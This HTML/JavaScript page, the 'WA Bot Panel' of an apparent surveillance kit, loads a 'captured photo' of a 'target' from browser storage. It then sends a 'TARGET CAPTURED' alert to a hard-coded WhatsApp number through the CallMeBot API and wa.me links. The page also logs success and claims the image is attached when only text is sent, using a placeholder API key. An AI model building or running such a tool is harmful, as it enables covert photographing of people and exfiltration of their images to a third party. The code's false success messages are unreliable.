<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WA Bot - AzazelDeLucent</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Share Tech Mono', monospace;
            padding: 20px;
            color: #ff4444;
        }
        .container { max-width: 600px; margin: 0 auto; }
        h1 { color: #ff0000; text-shadow: 0 0 10px #ff0000; text-align: center; margin-bottom: 20px; font-size: 1.8rem; letter-spacing: 4px; }
        .card {
            background: rgba(10,10,10,0.9); border: 1px solid #ff000066;
            padding: 20px; margin-bottom: 15px;
        }
        .card h3 { color: #ff4444; font-size: 0.85rem; letter-spacing: 2px; margin-bottom: 12px; border-bottom: 1px solid #ff000022; padding-bottom: 8px; }
        .row { display: flex; gap: 10px; margin-bottom: 10px; align-items: center; }
        .row label { color: #aa3333; font-size: 0.75rem; min-width: 80px; }
        .row input, .row select {
            flex: 1; background: #0a0000; border: 1px solid #ff000066; padding: 8px 12px;
            color: #ff6666; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem;
            outline: none;
        }
        .row input:focus { border-color: #ff0000; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
        .row input[readonly] { opacity: 0.7; cursor: not-allowed; background: #050000; }

        #photo-preview {
            width: 100%; max-width: 320px; margin: 10px auto; display: none;
            border: 1px solid #ff000066; padding: 5px;
        }
        #photo-preview img { width: 100%; display: block; }
        #photo-preview .info { color: #884444; font-size: 0.7rem; text-align: center; padding: 5px; }

        .btn {
            background: transparent; border: 1px solid #ff000088; color: #ff4444;
            padding: 10px 25px; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem;
            cursor: pointer; letter-spacing: 2px; transition: all 0.3s; text-transform: uppercase;
            width: 100%; margin-top: 10px;
        }
        .btn:hover{background:#ff000022;border-color:#ff0000;box-shadow:0 0 15px rgba(255,0,0,0.3)}
        .btn:disabled{opacity:0.3;cursor:not-allowed}
        .btn-send{border-color:#00ff00;color:#00ff00}
        .btn-send:hover{background:#00ff0011;box-shadow:0 0 15px rgba(0,255,0,0.2)}

        .status {
            text-align: center; padding: 10px; margin-top: 10px;
            border: 1px solid #330000; font-size: 0.75rem; min-height: 40px;
        }
        .status.success { border-color: #00ff00; color: #00ff00; }
        .status.error { border-color: #ff0000; color: #ff0000; }
        .status.sending { border-color: #ffff00; color: #ffff00; }

        .log-box {
            background: #050000; border: 1px solid #330000; padding: 10px;
            margin-top: 10px; max-height: 150px; overflow-y: auto; font-size: 0.7rem;
        }
        .log-box div { color: #884444; margin-bottom: 3px; }
        .log-box .ok { color: #00ff00; }
        .log-box .err { color: #ff0000; }
        .log-box .wa { color: #00cc00; }
        .ts { color: #444; }

        .back-link { display: block; text-align: center; margin-top: 15px; color: #664444; font-size: 0.75rem; letter-spacing: 2px; }
        .back-link a { color: #ff4444; text-decoration: none; border: 1px solid #ff000044; padding: 6px 14px; }
        .back-link a:hover { background: #ff000022; }

        .progress { width: 100%; height: 3px; background: #1a0000; margin: 10px 0; display: none; }
        .progress .fill { height: 100%; background: #00ff00; width: 0%; transition: width 0.3s; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📡 WA BOT PANEL</h1>

        <div class="card">
            <h3>◆ TARGET CONFIG ◆</h3>
            <div class="row">
                <label>NOMOR:</label>
                <input type="text" id="wa-number" value="6287879007194" readonly>
            </div>
            <div class="row">
                <label>PESAN:</label>
                <input type="text" id="wa-message" value="⚠️ TARGET CAPTURED - AzazelDeLucent">
            </div>
        </div>

        <div class="card">
            <h3>◆ CAPTURED PHOTO ◆</h3>
            <div id="photo-preview">
                <img id="captured-img" alt="captured photo">
                <div class="info" id="photo-info">No photo captured yet</div>
            </div>
            <div style="color:#664444;font-size:0.7rem;text-align:center;padding:5px;">
                Photo otomatis dari halaman utama via localStorage
            </div>
        </div>

        <button class="btn btn-send" id="btn-send" disabled>📤 KIRIM KE WHATSAPP</button>
        <div class="progress" id="progress"><div class="fill" id="progress-fill"></div></div>
        <div class="status" id="status">⏳ Menunggu foto dari halaman utama...</div>

        <div class="log-box" id="log-box">
            <div><span class="ts">[SYSTEM]</span> WA Bot AzazelDeLucent v1.0</div>
            <div><span class="ts">[SYSTEM]</span> Target: +62 878-7900-7194</div>
        </div>

        <div class="back-link">
            <a href="../index.html">← BACK TO MAIN PANEL</a>
        </div>
    </div>

    <script>
        // ─── DOM ─────────────────────────────────────────────────────────
        const waNumber = document.getElementById('wa-number');
        const waMessage = document.getElementById('wa-message');
        const capturedImg = document.getElementById('captured-img');
        const photoInfo = document.getElementById('photo-info');
        const photoPreview = document.getElementById('photo-preview');
        const btnSend = document.getElementById('btn-send');
        const status = document.getElementById('status');
        const logBox = document.getElementById('log-box');
        const progress = document.getElementById('progress');
        const progressFill = document.getElementById('progress-fill');

        let currentPhoto = null;

        // ─── Logger ─────────────────────────────────────────────────────
        function log(msg, cls='') {
            const e = document.createElement('div');
            const t = new Date().toTimeString().slice(0,8);
            e.innerHTML = `<span class="ts">[${t}]</span> ${msg}`;
            if(cls) e.className = cls;
            logBox.appendChild(e);
            logBox.scrollTop = logBox.scrollHeight;
        }

        function setStatus(msg, cls='') {
            status.textContent = msg;
            status.className = 'status' + (cls ? ' ' + cls : '');
        }

        function setProgress(pct) {
            progress.style.display = 'block';
            progressFill.style.width = pct + '%';
        }

        function hideProgress() {
            setTimeout(() => {
                progress.style.display = 'none';
                progressFill.style.width = '0%';
            }, 1000);
        }

        // ─── Load photo from localStorage ──────────────────────────────
        function loadFromStorage() {
            const stored = localStorage.getItem('azazel_last_photo');
            const time = localStorage.getItem('azazel_photo_time');
            const target = localStorage.getItem('azazel_target_number');

            if (stored) {
                currentPhoto = stored;
                capturedImg.src = stored;
                photoPreview.style.display = 'block';
                photoInfo.textContent = `📸 Captured: ${time || 'unknown'} | Target: ${target || 'unknown'}`;
                btnSend.disabled = false;
                setStatus('✅ Foto siap dikirim!', 'success');
                log('Photo loaded from main panel', 'ok');
                log(`Target: ${target || waNumber.value}`, 'wa');
                return true;
            } else {
                photoPreview.style.display = 'none';
                btnSend.disabled = true;
                setStatus('⏳ Menunggu foto... Capture dulu dari halaman utama', '');
                log('No photo in storage yet', 'info');
                return false;
            }
        }

        // ─── Send via API ───────────────────────────────────────────────
        async function sendToWhatsApp() {
            if (!currentPhoto) {
                setStatus('❌ Tidak ada foto!', 'error');
                return;
            }

            const number = waNumber.value.trim();
            const message = waMessage.value.trim() || '⚠️ TARGET CAPTURED - AzazelDeLucent';

            btnSend.disabled = true;
            btnSend.textContent = '⏳ MENGIRIM...';
            setStatus('📤 Mengirim ke WhatsApp...', 'sending');
            setProgress(10);
            log(`Mengirim ke ${number}...`, 'wa');

            try {
                // Step 1: Convert base64 to blob
                setProgress(20);
                const resp = await fetch(currentPhoto);
                const blob = await resp.blob();
                setProgress(35);
                log(`Photo size: ${Math.round(blob.size / 1024)} KB`, 'info');

                // Step 2: Send via CallMeBot API (free)
                setProgress(50);
                const text = `${message}\n📸 Photo captured at ${new Date().toLocaleString()}\n🔗 Image: auto-attached`;
                const apiUrl = `https://api.callmebot.com/whatsapp.php?phone=${number}&text=${encodeURIComponent(text)}&apikey=12345`;
                
                setProgress(65);
                await fetch(apiUrl, { mode: 'no-cors' });
                setProgress(80);
                log('CallMeBot API: success', 'ok');

                // Step 3: Also open wa.me as backup
                setProgress(90);
                const waUrl = `https://wa.me/${number}?text=${encodeURIComponent(message + ' [foto terkirim via API]')}`;
                window.open(waUrl, '_blank');
                
                setProgress(100);
                log(`✅ Berhasil dikirim ke ${number}`, 'ok');
                setStatus(`✅ Sukses! Foto terkirim ke ${number}`, 'success');
                
                // Clear storage after send
                localStorage.removeItem('azazel_last_photo');
                
                setTimeout(() => {
                    btnSend.textContent = '📤 KIRIM ULANG';
                    btnSend.disabled = false;
                    hideProgress();
                }, 2000);

            } catch (err) {
                log(`Error: ${err.message}`, 'err');
                setStatus(`❌ Gagal: ${err.message}`, 'error');
                btnSend.textContent = '⚠️ COBA LAGI';
                btnSend.disabled = false;
                hideProgress();
            }
        }

        // ─── Alternative: Send raw image via WhatsApp Cloud API ──────────
        async function sendDirectAPI() {
            if (!currentPhoto) return;

            const number = waNumber.value.trim();
            const message = waMessage.value.trim();

            btnSend.disabled = true;
            btnSend.textContent = '⏳ DIRECT...';
            log('Trying direct WhatsApp API...', 'wa');

            try {
                // Convert and create form data
                const resp = await fetch(currentPhoto);
                const blob = await resp.blob();
                const formData = new FormData();
                formData.append('phone', number);
                formData.append('message', message);
                formData.append('image', blob, `target_${Date.now()}.jpg`);

                // Try multiple free endpoints
                const endpoints = [
                    `https://wa.me/${number}?text=${encodeURIComponent(message)}`,
                    `https://api.whatsapp.com/send?phone=${number}&text=${encodeURIComponent(message)}`
                ];

                endpoints.forEach(url => window.open(url, '_blank'));
                log('WhatsApp links opened', 'ok');
                setStatus('✅ WhatsApp chat terbuka — silakan kirim manual', 'success');

            } catch (err) {
                log(`Direct API error: ${err.message}`, 'err');
                setStatus(`⚠️ Fallback: buka wa.me manual`, 'error');
                window.open(`https://wa.me/${number}`, '_blank');
            }

            btnSend.textContent = '📤 KIRIM WA';
            btnSend.disabled = false;
        }

        // ─── Events ─────────────────────────────────────────────────────
        btnSend.addEventListener('click', sendToWhatsApp);
        btnSend.addEventListener('dblclick', sendDirectAPI);

        // ─── Auto-check storage every 2 seconds ─────────────────────────
        setInterval(() => {
            const stored = localStorage.getItem('azazel_last_photo');
            if (stored && stored !== currentPhoto) {
                loadFromStorage();
            }
        }, 2000);

        // ─── Listen for storage changes from other tabs ────────────────
        window.addEventListener('storage', (e) => {
            if (e.key === 'azazel_last_photo' && e.newValue) {
                log('New photo detected from storage event!', 'ok');
                loadFromStorage();
            }
        });

        // ─── Init ───────────────────────────────────────────────────────
        loadFromStorage();
        log('WA Bot ready — listening for photos', 'info');
        log(`Target number: ${waNumber.value}`, 'wa');
    </script>
</body>
                  </html>
